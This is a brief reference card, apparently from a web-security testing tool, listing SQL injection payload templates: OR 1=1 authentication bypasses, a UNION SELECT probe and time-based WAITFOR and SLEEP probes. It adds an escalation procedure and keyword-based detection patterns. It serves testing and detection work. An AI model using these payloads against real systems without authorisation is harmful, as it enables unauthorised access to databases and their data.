# SQLi Payload Templates

## Overview
- Purpose: Provide reusable SQL injection payload strings for basic, advanced, and time-based tests.
- Category: web_security
- Severity: info
- Tags: sqli, payloads, web_security, injection

## Context and Use-Cases
- Probing error-based, union-based, and time-based injection behavior.

## Key Parameters and Inputs
- attack_type (string): "sqli"
- complexity (string): one of [basic, advanced, time_based]

## Procedure
1. Start with basic authentication bypass payloads.
2. Escalate to UNION-based and enumeration payloads.
3. Use time-based probes for blind contexts.

## Examples
- Payloads:
```
' OR '1'='1
' OR 1=1--
' UNION SELECT 1,2,3,4,5--
'; WAITFOR DELAY '00:00:05'--
' OR (SELECT SLEEP(5))--
```

## Indicators / Detection
- Patterns: presence of `'--`, `UNION SELECT`, `SLEEP`, `WAITFOR DELAY` in inputs/queries.

## Limitations and Caveats
- Risk classification is keyword-based.

## Source Excerpts
- [S1] "sqli": { "basic": ["' OR '1'='1", "' OR 1=1--", ...], "advanced": ["' UNION SELECT 1,2,3,4,5--", ...], "time_based": ["'; WAITFOR DELAY '00:00:05'--", ...] }

## References
-
